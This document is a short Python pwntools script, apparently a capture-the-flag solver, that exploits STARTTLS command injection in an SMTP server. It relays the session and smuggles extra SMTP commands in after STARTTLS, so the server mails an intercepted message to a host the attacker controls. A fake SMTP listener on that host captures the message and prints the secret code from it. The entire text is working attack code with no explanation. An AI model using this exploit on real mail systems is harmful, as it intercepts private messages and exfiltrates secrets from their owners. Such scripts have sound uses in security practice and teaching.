#!/usr/bin/env python3

from pwn import*
import ssl
import urllib.parse

cli = listen(2525)

fake = listen(8825)

if args.WEB_PORT:
    web = remote(args.HOST or '127.0.0.1', args.WEB_PORT)
    content = ('addr=' + urllib.parse.quote_plus(f'{args.SOLVER_HOST}:2525')).encode()
    web.send('\r\n'.join([
        'POST / HTTP/1.1',
        f'Content-Length: {len(content)}',
        'Content-Type: application/x-www-form-urlencoded',
        '',
        ''
    ]).encode() + content)

cli.wait_for_connection()

srv = remote(args.HOST or '127.0.0.1', args.PORT or 8025)
cli.send(srv.recvline())
srv.send(cli.recvline())
cli.send(srv.recvline())
cli.send(srv.clean())
cli.recvline()

srv.send(f'''\
STARTTLS
HELO localhost
MAIL FROM: <root@localhost>
RCPT TO: <root@{args.SOLVER_HOST}>
DATA
From: evil h4x0r
To: interested parties
Subject: Intercepted message

Nice! Here it is:
'''.encode())

cli << srv << cli

fake.sendline(b'220 Siemano')
while True:
    l = fake.recvline()
    if b'data' in l:
        break
    fake.sendline(b'250 OK')
fake.sendline(b'354 Carry on')
fake.recvuntil(b'The code you asked for:', drop=True)
print(fake.recvline().strip().decode())
